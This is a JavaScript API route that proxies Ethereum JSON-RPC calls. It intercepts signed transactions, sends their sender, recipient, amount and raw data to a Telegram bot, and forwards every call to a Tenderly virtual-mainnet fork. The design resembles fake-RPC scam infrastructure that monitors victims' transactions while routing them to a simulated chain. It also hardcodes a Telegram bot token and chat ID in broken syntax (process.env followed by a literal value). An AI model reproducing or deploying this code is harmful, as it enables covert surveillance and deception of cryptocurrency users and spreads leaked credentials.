import axios from 'axios';
import { Transaction } from '@ethereumjs/tx';
import Common from '@ethereumjs/common';
import { bufferToHex } from 'ethereumjs-util';

const FORWARD_TO = 'https://virtual.mainnet.eu.rpc.tenderly.co/b9886e55-0b6a-4cf8-b29a-f29f6a00cb51'; // Replace with your own
const TELEGRAM_BOT_TOKEN = process.env.8239300841:AAFH7VfCmBNFPBNmi4uXyK0ZVex4GCWBqrM;
const TELEGRAM_CHAT_ID = process.env.6706118675;

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Only POST allowed' });
  }

  try {
    const { method, params } = req.body;

    if (method === 'eth_sendRawTransaction') {
      const rawTxHex = params[0];
      const rawTxBuffer = Buffer.from(rawTxHex.replace(/^0x/, ''), 'hex');

      const common = new Common({ chain: 'mainnet' });
      const tx = Transaction.fromSerializedTx(rawTxBuffer, { common });

      const from = tx.getSenderAddress().toString();
      const to = tx.to?.toString() || 'Contract Creation';
      const valueEth = Number(tx.value) / 1e18;

      const msg = `🚨 *New Raw TX*\n` +
        `*From:* \`${from}\`\n` +
        `*To:* \`${to}\`\n` +
        `*Amount:* \`${valueEth} ETH\`\n` +
        `*Raw TX:* \n\`${rawTxHex.slice(0, 100)}...\``;

      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: msg,
        parse_mode: 'Markdown'
      });

      console.log('TX sent to Telegram');
    }

    const response = await axios.post(FORWARD_TO, req.body, {
      headers: { 'Content-Type': 'application/json' }
    });

    res.status(200).json(response.data);
  } catch (error) {
    console.error('Error:', error.message);
    res.status(500).json({ error: 'Forwarding failed' });
  }
}
